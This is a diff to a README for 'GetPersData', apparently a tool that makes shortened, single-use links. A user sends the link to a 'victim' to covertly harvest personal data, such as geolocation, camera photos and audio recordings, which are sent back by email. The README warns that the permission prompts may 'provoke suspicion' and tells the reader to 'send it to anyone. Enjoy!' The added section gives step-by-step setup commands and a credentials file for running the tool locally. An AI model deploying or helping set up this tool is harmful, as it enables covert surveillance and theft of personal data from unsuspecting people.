@@ -16,4 +16,29 @@ https://get-pers-data.web.app/
 
 - Use the "Try to get geolocation", "Take a photo" and "Record an audio" options at your own risk, as this will request additional permissions from the victim, which may provoke suspicion.
 
-- Copy the link and send it to anyone. Enjoy!
+- Copy the link and send it to anyone. Keep in mind that the link has a limited number of uses (usually only one) and then becomes unavailable.
+
+## How to launch it on your machine?
+
+1. Clone the repository
+```bash
+git clone https://github.com/dominon12/GetPersData
+```
+2. Go to the folder 
+```bash
+cd GetPersData
+```
+3. Install dependencies
+```bash
+npm install
+```
+4. In '/src/Services/' folder create a file called 'Credentials.ts' with the following code
+```typescript
+export const LINK_SHORTENER_TOKEN = "YOUR TOKEN FROM bit.ly"; // Needs to shortify url
+export const BACKEND_TOKEN = "YOUR BACKEND TOKEN"; // Needs to send an email
+```
+5. Run the app
+```bash
+npm run start
+```
+6. Open 'http://localhost:3000/' and enjoy
